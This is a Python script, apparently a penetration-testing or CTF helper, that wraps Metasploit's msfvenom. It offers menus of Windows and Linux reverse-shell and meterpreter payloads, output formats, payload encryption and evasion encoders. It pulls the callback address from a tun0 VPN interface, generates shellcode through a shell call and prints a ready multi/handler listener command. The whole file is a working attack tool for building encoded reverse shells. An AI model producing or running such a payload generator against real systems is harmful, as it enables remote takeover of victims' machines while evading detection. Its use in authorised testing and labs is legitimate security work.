import os
import random
import string
import sys
import netifaces
import subprocess
import threading


def set_payload():
    print("\033[34mWINDOWS PAYLOADS\033[0m")
    print("1. windows/x64/meterpreter/reverse_https")
    print("2. windows/meterpreter_reverse_https")
    print("3. windows/meterpreter/reverse_https")
    print("4. windows/x64/meterpreter/reverse_tcp")
    print("5. windows/meterpreter/reverse_tcp")
    print("6. windows/shell_reverse_tcp")
    print("7. windows/shell/reverse_tcp")
    print("\033[33mLINUX PAYLOADS\033[0m")
    print("8. linux/x64/meterpreter_reverse_https")
    print("9. linux/x86/meterpreter_reverse_https")
    print("10. linux/x64/meterpreter/reverse_tcp")
    print("11. linux/x86/meterpreter/reverse_tcp")
    print("12. linux/x64/shell_reverse_tcp")
    print("13. linux/x86/shell_reverse_tcp")
    print("14. linux/x64/shell/reverse_tcp")
    print("15. linux/x86/shell/reverse_tcp")
    payload = input("Choose a payload (1-13): ")
    
    payload_list = [
        "windows/x64/meterpreter/reverse_https",
        "windows/meterpreter_reverse_https",
        "windows/meterpreter/reverse_https",
        "windows/x64/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_tcp",
        "windows/shell_reverse_tcp",
        "windows/shell/reverse_tcp",
        "linux/x64/meterpreter_reverse_https",
        "linux/x86/meterpreter_reverse_https",
        "linux/x64/meterpreter/reverse_tcp",
        "linux/x86/meterpreter/reverse_tcp",
        "linux/x64/shell_reverse_tcp",
        "linux/x86/shell_reverse_tcp",
        "linux/x64/shell/reverse_tcp",
        "linux/x86/shell/reverse_tcp"
    ]
    
    if payload == "":
        payload = "windows/x64/meterpreter/reverse_https"
    else:
        try:
            payload = payload_list[int(payload) - 1]
        except ValueError:
            payload = "windows/x64/meterpreter/reverse_https"
        except IndexError:
            payload = "windows/x64/meterpreter/reverse_https"
    
    return payload

def set_format(payload):
    format_dict = {
        "1": "exe/elf",
        "2": "python",
        "3": "perl",
        "4": "ps1",
        "5": "csharp",
        "6": "c",
        "7": "dll",
        "8": "vbapplication",
        "9": "vbs",
        "10": "vba",
        "11": "hta-psh",
        "12": "asp",
        "13": "aspx",
        "14": "jsp",
        "15": "sh",
        "16": "raw",
        "17": "msi",
        "18": "war",
        "19": "jar"
    }
    print("\033[34mFORMATS\033[0m")
    print("1. exe/elf (default)")
    print("2. python")
    print("3. perl")
    print("4. ps1")
    print("5. csharp")
    print("6. c")
    print("7. dll")
    print("8. vbapplication")
    print("9. vbs")
    print("10. vba")
    print("11. hta-psh")
    print("12. asp")
    print("13. aspx")
    print("14. jsp")
    print("15. sh")
    print("16. raw")
    print("17. msi")
    print("18. war")
    print("19. jar")
    format = input("Choose a format by number (1-19) or name: ")
    if format == "":
        format = "exe/elf"
    if format in format_dict:
        format = format_dict[format]
    elif format not in format_dict and format not in ("", "exe/elf"):
        print("Error: Invalid input. Please choose a valid format.")
        format = set_format(payload)
    if format == "exe/elf":
        if payload.startswith("windows"):  
            format = "exe"
        elif payload.startswith("linux"):
            format = "elf"
    return format

def set_encryptor():
    print("\033[34mENCRYPTION\033[0m")
    print("1. none")
    print("2. aes256")
    print("3. rc4")
    print("4. xor")
    encryptor = input("Choose an encryption type (1-4): ")

    if encryptor == "1" or encryptor.lower() == "none":
        return ""
    elif encryptor == "2" or encryptor.lower() == "aes256":
        key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        iv = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        return f"--encrypt aes256 --encrypt-key {key} --encrypt-iv {iv}", key, iv
    elif encryptor == "3" or encryptor.lower() == "rc4":
        key = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        return f"--encrypt rc4 --encrypt-key {key}", key, ""
    elif encryptor == "4" or encryptor.lower() == "xor":
        key = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        return f"--encrypt xor --encrypt-key {key}", key, ""
    else:
        return "", "", ""



def set_encoder():
    encoder_dict = {
        "1": "none",
        "2": "x86/shikata_ga_nai",
        "3": "x64/xor",
        "4": "x64/xor_dynamic",
        "5": "x64/zutto_dekiru",
    }
    print("\033[34mENCODERS\033[0m")
    print("1. none (default)")
    print("2. x86/shikata_ga_nai")
    print("3. x64/xor")
    print("4. x64/xor_dynamic")
    print("5. x64/zutto_dekiru")
    encoder = input("Choose an encoder by number (1-5) or name: ")
    if encoder == "":
        encoder = "none"
    if encoder in encoder_dict:
        encoder = encoder_dict[encoder]
    elif encoder not in encoder_dict and encoder not in ("", "none"):
        print("Error: Invalid input. Please choose a valid encoder.")
        encoder = set_encoder()
    return encoder

def set_iterations():
    print("\033[34mITERATIONS\033[0m")
    iterations = input("Enter number of encoding iterations (default: 1): ")
    if iterations == "":
        iterations = "1"
    try:
        iterations = int(iterations)
    except ValueError:
        iterations = 1
    return iterations

def set_output_type(output_type=None):
    if output_type is None:
        print("\033[34mOUTPUT TYPE\033[0m")
        print("1. File (default)")
        print("2. Terminal")
        output_type = input("Choose an output type (1-2): ")
        if output_type == "":
            output_type = "1"

    if output_type == "1":
        output_type = input("Enter a filename: ")
    elif output_type == "2":
        output_type = ""
    elif output_type == "3":
        print("powershell shellcode runner placeholder")
    elif output_type == "4":
        print("c# shellcode runner placeholder")
    else:
        output_type = output_type
    return output_type

def set_msfvenom(payload, lhost, lport, format, encryptor, encoder, rounds, output_type):
    msfvenom_command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format}"
    if encryptor[0] != "":
        msfvenom_command += " " + encryptor[0]
    if encoder != "none":
        msfvenom_command += f" --encoder {encoder} -t 300 prepend-fork=true -i {rounds}"
    if output_type != "":
        msfvenom_command += f" -o {output_type}"

    return msfvenom_command, encryptor[1], encryptor[2]

def main():
    if len(sys.argv) > 1:
        lhost = sys.argv[1]

        if len(sys.argv) > 2:
            lport = sys.argv[2]
        else:
            lport = "443"
    else:
        interfaces = netifaces.interfaces()

        if "tun0" in interfaces:
            addr_info = netifaces.ifaddresses("tun0")

            if netifaces.AF_INET in addr_info:
                lhost = addr_info[netifaces.AF_INET][0]["addr"]
                lport = "443"
            else:
                print("The tun0 interface does not have an IPv4 address.")
                return
        else:
            print("The tun0 interface does not exist.")
            return

    payload = set_payload()
    format = set_format(payload)
    encryptor = set_encryptor()
    encoder = set_encoder()
    if encoder != "none":
        rounds = set_iterations()
    else:
        rounds = 0
    output_type = set_output_type()
    msfvenom_command, encrypt_key, encrypt_iv = set_msfvenom(payload, lhost, lport, format, encryptor, encoder, rounds, output_type)

    print("\033[33m\nShellcode:\033[0m")
    subprocess.run(msfvenom_command, shell=True)

    print("\033[33m\nmsfvenom command:\033[0m")
    print(msfvenom_command)


    print("\033[33m\nmsfconsole command:\033[0m")
    if "windows" in payload:
        if "https" in payload:
            msfconsole_command = f"sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set EnableStageEncoding true; set StagerVerifySSLCert true; set HandlerSSLCert /key/custom.pem; set ExitOnSession false; exploit -j\""
        else:
            msfconsole_command = f"sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set EnableStageEncoding true; set ExitOnSession false; exploit -j\""
    else:
        if "https" in payload:
            msfconsole_command = f"sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set StagerVerifySSLCert true; set HandlerSSLCert /key/custom.pem; set ExitOnSession false; exploit -j\""
        else:
            msfconsole_command = f"sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\""
    print(msfconsole_command)

    if "encrypt" in msfvenom_command:
        print("\n\033[90m--encrypt-key:\033[0m", encrypt_key)
        print("\033[90m--encrypt-iv:\033[0m", encrypt_iv)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("")
